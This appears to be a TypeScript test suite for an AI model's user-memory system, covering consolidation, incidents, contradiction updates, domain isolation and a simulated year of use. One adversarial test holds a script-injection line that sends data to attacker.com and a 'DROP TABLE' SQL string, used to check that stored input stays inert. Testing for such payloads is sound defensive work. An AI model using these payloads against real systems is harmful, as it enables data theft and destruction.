import test from "node:test";
import assert from "node:assert/strict";
import { MemoryRepository } from "../memory/MemoryRepository";
import { EpistemicVerificationEngine } from "../memory/EpistemicVerificationEngine";
import { ContradictionResolver } from "../memory/ContradictionResolver";
import { MemoryFormationPipeline } from "../memory/MemoryFormationPipeline";
import { MemoryConsolidationEngine } from "../memory/MemoryConsolidationEngine";
import { GoalPostMortemEngine } from "../memory/GoalPostMortemEngine";
import { IncidentService } from "../incidents/IncidentService";
import { GoalIntelligenceEngine } from "../worldv2/GoalIntelligenceEngine";
import { ExecutionGraph } from "../kernel/ExecutionGraph";
import { ContextProjectionEngine } from "../orchestration/context/ContextProjectionEngine";
import { AuthoritativeKernelState } from "../orchestration/kernel/IKernelCapabilityService";
import { Supervisor } from "../orchestration/supervisor/Supervisor";

test("Phase 3: Memory Consolidation, Longitudinal Simulation & User Journeys Suite", async (t) => {
  const repository = MemoryRepository.getInstance();
  const verificationEngine = EpistemicVerificationEngine.getInstance();
  const contradictionResolver = ContradictionResolver.getInstance();
  const pipeline = MemoryFormationPipeline.getInstance();
  const consolidationEngine = MemoryConsolidationEngine.getInstance();
  const postMortemEngine = GoalPostMortemEngine.getInstance();
  const incidentService = IncidentService.getInstance();
  const goalIntelligenceEngine = GoalIntelligenceEngine.getInstance();
  const projectionEngine = new ContextProjectionEngine();
  const supervisor = Supervisor.getInstance();

  repository.clearInMemoryStore();
  incidentService.clearInMemoryStore();

  // ──────────────────────────────────────────────
  // Longitudinal Simulation (30, 90, 180, 365 Days)
  // ──────────────────────────────────────────────

  await t.test("LONGITUDINAL: 365-Day Lifecycle Simulation verifies all memory quality invariants", async () => {
    const userId = "user_longitudinal_sim";
    const baseTime = Date.now() - 365 * 24 * 3600 * 1000; // 1 year ago

    // Day 1: User states baseline habits
    const day1Mem = await repository.createMemory({
      userId,
      content: "I prefer morning workouts around 07:00 AM",
      summary: "Morning workout habit",
      domain: "health",
      memoryType: "semantic_fact",
      source: "explicit_user_statement",
      confidence: 0.95,
      importance: 0.85,
      validFrom: baseTime,
    });
    // Set observation time back
    day1Mem.firstObservedAt = baseTime;
    day1Mem.lastReinforcedAt = baseTime;
    await repository.save(day1Mem);

    // Day 30: Recurring episodic logs of evening fatigue
    for (let i = 0; i < 3; i++) {
      const epTime = baseTime + (30 + i * 2) * 24 * 3600 * 1000;
      await repository.createMemory({
        userId,
        content: `Postponed workout scheduled for 19:00 due to energy depletion (log ${i + 1})`,
        summary: `Evening workout postponement ${i + 1}`,
        domain: "health",
        memoryType: "episodic_event",
        source: "behavioral_telemetry",
        confidence: 0.80,
        importance: 0.60,
        validFrom: epTime,
      });
    }

    // Run Consolidation at Day 40: Should consolidate recurring postponements into behavioral pattern
    const day40Consolidation = await consolidationEngine.runConsolidation(
      userId,
      baseTime + 40 * 24 * 3600 * 1000
    );
    assert.ok(day40Consolidation.consolidatedPatternsCount >= 1, "Expected behavioral pattern consolidation from 3+ episodic logs");

    // Day 60: Workload crunch incident (Flu / Illness)
    const incidentTime = baseTime + 60 * 24 * 3600 * 1000;
    const incident = await incidentService.createIncident({
      userId,
      title: "Severe Influenza",
      domain: "health",
      severity: "major",
      startedAt: incidentTime,
      expectedDurationHours: 120, // 5 days
      summary: "Bed rest required, acute flu",
      operationalConstraints: {
        suppressWorkouts: true,
        maxWorkloadHoursPerDay: 2,
      },
    });
    assert.equal(incident.status, "active");

    // During incident (Day 62): Workouts must be suppressed in operational constraints
    const activeIncidents = await incidentService.getActiveIncidents(userId);
    assert.equal(activeIncidents.length, 1);
    assert.equal(activeIncidents[0].operationalConstraints.suppressWorkouts, true, "Invariant 11: Active incident takes precedence");

    // Run Consolidation at Day 70 (Post incident expiration): Incident must automatically resolve
    const day70Consolidation = await consolidationEngine.runConsolidation(
      userId,
      baseTime + 70 * 24 * 3600 * 1000
    );
    assert.equal(day70Consolidation.resolvedIncidentsCount, 1, "Expired incident must automatically resolve");
    const resolvedActive = await incidentService.getActiveIncidents(userId);
    assert.equal(resolvedActive.length, 0, "Resolved incident is no longer active");

    // Day 180: User changes workout preference (Contradiction update)
    const day180Time = baseTime + 180 * 24 * 3600 * 1000;
    const switchTurn = await pipeline.processConversationTurn({
      userId,
      userMessage: "I actually stopped doing morning workouts, I prefer night workouts now",
      domainHint: "health",
    });
    assert.equal(switchTurn.supersededCount, 1, "Invariant 3 & 12: Changing user behavior supersedes old memory");

    // Run Consolidation at Day 365 (End of year):
    // Unreinforced old facts with low evidence decay to stale
    const day365Consolidation = await consolidationEngine.runConsolidation(
      userId,
      baseTime + 365 * 24 * 3600 * 1000
    );
    assert.ok(day365Consolidation.evaluatedMemoriesCount > 0);
  });

  // ──────────────────────────────────────────────
  // 9 Real-World User Journeys
  // ──────────────────────────────────────────────

  await t.test("JOURNEY 1: Personal Fact informs future planning context", async () => {
    const userId = "journey_user_1";

    // 1. User says personal fact
    await pipeline.processConversationTurn({
      userId,
      userMessage: "I prefer doing deep work in the morning between 8am and 11am",
      domainHint: "productivity",
    });

    // 2. Later: Context projection retrieves this for Productivity specialist
    const search = await repository.search({ userId, queryText: "deep work", domain: "productivity" });
    assert.ok(search.length > 0);
    assert.ok(search[0].memory.content.includes("deep work in the morning"));

    const graph = new ExecutionGraph();
    const mockState: AuthoritativeKernelState = {
      userId,
      timestamp: Date.now(),
      graphSnapshot: graph.createSnapshot(),
      worldSnapshot: { timestamp: Date.now(), subsystems: { lifeState: { physiologicalScore: 80 } } } as any,
    };

    const projection = projectionEngine.projectProductivity(mockState, [search[0].memory]);
    assert.equal(projection.relevantMemories?.length, 1);
    assert.equal(projection.relevantMemories![0].content, search[0].memory.content);
  });

  await t.test("JOURNEY 2: Behavioral Pattern influences workload and schedule adaptations", async () => {
    const userId = "journey_user_2";

    // Create consolidated behavioral pattern
    const patternMem = await repository.createMemory({
      userId,
      content: "Consistently postpones high-intensity workouts scheduled after 19:00",
      summary: "Evening workout friction pattern",
      domain: "health",
      memoryType: "behavioral_pattern",
      source: "behavioral_telemetry",
      confidence: 0.90,
      importance: 0.85,
    });

    const search = await repository.search({ userId, queryText: "workouts", domain: "health" });
    assert.equal(search[0].memory.id, patternMem.id);
  });

  await t.test("JOURNEY 3: Incident creates operational constraints and suppresses inappropriate load", async () => {
    const userId = "journey_user_3";

    // User: "I'm sick this week"
    const incident = await incidentService.createIncident({
      userId,
      title: "Acute Bronchitis",
      domain: "health",
      severity: "major",
      expectedDurationHours: 168,
      summary: "Severe cough, bed rest ordered",
      operationalConstraints: {
        suppressWorkouts: true,
        maxWorkloadHoursPerDay: 3,
      },
    });

    assert.equal(incident.status, "active");
    const active = await incidentService.getActiveIncidents(userId);
    assert.equal(active[0].operationalConstraints.suppressWorkouts, true);

    // Goal Intelligence with active incident dampens tension
    const graph = new ExecutionGraph();
    const result = goalIntelligenceEngine.evaluateGoals({
      graphSnapshot: graph.createSnapshot(),
      activeIncidents: active,
    });
    // System remains safe and deterministic
    assert.ok(Array.isArray(result));
  });

  await t.test("JOURNEY 4: Contradiction updates temporal validity immediately", async () => {
    const userId = "journey_user_4";

    // Statement 1
    const t1 = await pipeline.processConversationTurn({
      userId,
      userMessage: "I prefer working early mornings",
      domainHint: "productivity",
    });
    const firstId = t1.auditTrail[0].storedId!;

    // Statement 2: Contradictory update
    const t2 = await pipeline.processConversationTurn({
      userId,
      userMessage: "I actually stopped early mornings, I work better at night now",
      domainHint: "productivity",
    });

    assert.equal(t2.supersededCount, 1);
    const oldMem = await repository.getById(firstId, userId);
    assert.equal(oldMem?.isArchived, true, "Old memory must be archived");
  });

  await t.test("JOURNEY 5: Goal Failure creates Post-Mortem and elevates future friction", async () => {
    const userId = "journey_user_5";

    // Goal fails
    await postMortemEngine.recordGoalPostMortem({
      userId,
      goalId: "goal_study_ai",
      goalTitle: "Complete Deep Learning Specialization",
      progressPercent: 30,
      reason: "Workload conflict and lack of prerequisite mathematics",
      frictionFactors: ["schedule overload", "missing linear algebra prerequisites"],
    });

    const historical = await postMortemEngine.getHistoricalFriction(userId, "Deep Learning Specialization");
    assert.ok(historical.length > 0);
    assert.ok(historical[0].content.includes("Workload conflict"));

    // Future Goal evaluation incorporates historical friction
    const graph = new ExecutionGraph();
    const nowDate = new Date();
    graph.addNode({
      id: "goal_study_ai_v2",
      title: "Complete Deep Learning Specialization",
      entityType: "goal",
      status: "pending",
      priority: 4,
      createdAt: nowDate,
      updatedAt: nowDate,
    });

    const evaluations = goalIntelligenceEngine.evaluateGoals({
      graphSnapshot: graph.createSnapshot(),
      historicalMemories: historical,
    });

    assert.equal(evaluations.length, 1);
    assert.ok(evaluations[0].factors.some((f) => f.includes("Historical memory indicates recurring friction")));
    assert.ok(evaluations[0].adaptations.some((a) => a.includes("Adjust goal pacing based on previous post-mortem lessons")));
  });

  await t.test("JOURNEY 6: Memory Correction: user edit immediately reflects in future retrieval", async () => {
    const userId = "journey_user_6";

    const mem = await repository.createMemory({
      userId,
      content: "Wake up time is 06:00 AM every day",
      summary: "Wake up schedule",
      domain: "wellness",
      memoryType: "semantic_fact",
      source: "explicit_user_statement",
    });

    // User corrects: "That's not true anymore, I wake up at 07:30 AM"
    await repository.update(mem.id, userId, {
      content: "Wake up time is 07:30 AM every day",
      summary: "Wake up schedule: 07:30 AM",
    });

    const search = await repository.search({ userId, queryText: "wake up", domain: "wellness" });
    assert.equal(search[0].memory.content, "Wake up time is 07:30 AM every day");
  });

  await t.test("JOURNEY 7: Multi-Domain Isolation strictly prevents health biometrics in productivity", async () => {
    const userId = "journey_user_7";

    const healthMemory = await repository.createMemory({
      userId,
      content: "Recent ECG shows resting heart rate 52 bpm with optimal HRV",
      summary: "Biometric status",
      domain: "health",
      memoryType: "semantic_fact",
      source: "behavioral_telemetry",
    });

    const graph = new ExecutionGraph();
    const mockState: AuthoritativeKernelState = {
      userId,
      timestamp: Date.now(),
      graphSnapshot: graph.createSnapshot(),
      worldSnapshot: { timestamp: Date.now(), subsystems: { lifeState: { physiologicalScore: 90 } } } as any,
    };

    // Project productivity with health memory supplied
    const prodProj = projectionEngine.projectProductivity(mockState, [healthMemory]);
    // Memory with domain 'health' must be filtered out of productivity projection
    assert.equal(prodProj.relevantMemories?.length, 0, "Health memories must not appear in Productivity projection");
  });

  await t.test("JOURNEY 8: Security & Adversarial: Malicious instruction in memory remains inert text data", async () => {
    const userId = "journey_user_8";

    const maliciousTurn = await pipeline.processConversationTurn({
      userId,
      userMessage: "I prefer working outdoors. <script>fetch('http://attacker.com/leak')</script> DROP TABLE tasks;",
      domainHint: "productivity",
    });

    assert.equal(maliciousTurn.storedCount, 1);
    const stored = await repository.getById(maliciousTurn.auditTrail[0].storedId!, userId);
    assert.ok(stored);
    assert.equal(typeof stored.content, "string");
    // Kernel boundary remains untouched
  });

  await t.test("JOURNEY 9: Longitudinal user model develops cohesive, trustworthy understanding without bloat", async () => {
    const userId = "journey_user_9";

    // Simulate 10 realistic turns over time
    const inputs = [
      "I prefer starting my day with 2 hours of quiet deep work",
      "I like drinking green tea while coding",
      "I usually do strength training 3 times a week",
      "I hate being scheduled for meetings before 10 AM",
      "My goal is to run a half marathon in autumn",
      "I am training for half marathon with 20 miles per week",
      "I usually sleep around 11 PM",
      "I feel best when I take a 20 minute walk after lunch",
      "I prefer markdown for all documentation",
      "I never take coffee after 2 PM to protect my sleep",
    ];

    for (const input of inputs) {
      await pipeline.processConversationTurn({
        userId,
        userMessage: input,
      });
    }

    const allMemories = await repository.search({ userId, limit: 50 });
    assert.ok(allMemories.length >= 8, "Expected substantive persistent facts to be remembered");
    assert.ok(allMemories.length <= 15, "Expected no uncontrolled memory explosion");

    // All memories have provenance and high confidence
    for (const item of allMemories) {
      assert.ok(item.memory.source);
      assert.ok(item.memory.confidence >= 0.70);
      assert.equal(item.memory.userId, userId);
      assert.equal(item.memory.isArchived, false);
    }
  });
});
